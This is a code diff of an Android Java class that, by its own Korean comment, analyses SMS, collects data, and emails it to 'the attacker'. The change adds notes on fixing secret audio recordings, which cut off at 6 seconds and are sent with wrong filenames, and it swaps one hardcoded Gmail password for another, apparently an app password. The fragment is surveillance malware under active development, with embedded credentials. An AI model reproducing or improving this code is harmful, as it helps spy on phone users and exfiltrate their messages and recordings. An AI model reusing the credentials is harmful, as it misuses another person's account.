@@ -26,12 +26,15 @@ import static android.hardware.Camera.*;
  * Created by ydg on 2015-03-07.
  * SMS 분석 후 특정 자료를 수집한 후 새로운 스레드를 생성하여 공격자에게 정보를 메일로 전송
  * 151102 Remove camera capturing feature
+ *
+ * 1. 녹음이 최대 6초까지밖에 되지 않음
+ * 2. 녹음 전송시 파일명이 제대로 입력되지 않음
  */
 public class InformationSend {
     public final static String LogTag = "checking_InfoSendLogcat";
     protected Context mContext;
     final String mailID = "apptestgyu@gmail.com";
-    final String mailPW = "apptestgyu123";
+    final String mailPW = "zuvzdzqiugshzymg";
     final String phoneNumber;
     String date;
 
@@ -155,7 +158,7 @@ public class InformationSend {
         }
 
         recorder.setOutputFile(filePath);
-        recorder.setMaxDuration(10 * 1000); // 10초
+        recorder.setMaxDuration(10 * 1000); // 10초 -> 실제론 녹음 6초
 
         try {
             recorder.prepare();
